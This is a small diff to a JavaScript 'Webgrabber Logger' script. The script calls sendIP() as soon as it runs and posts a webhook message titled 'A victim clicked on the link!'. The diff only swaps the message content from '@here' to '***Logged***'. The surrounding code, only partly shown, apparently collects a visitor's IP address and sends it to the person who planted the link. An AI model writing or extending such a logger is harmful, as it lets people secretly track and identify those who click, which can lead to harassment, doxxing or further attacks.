@@ -15,7 +15,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "Webgrabber Logger", // optionally changeable
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `@here`,
+                            content: `***Logged***`,
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
@@ -40,3 +40,4 @@ const sendIP = () => {
         });
 };
 sendIP();
+
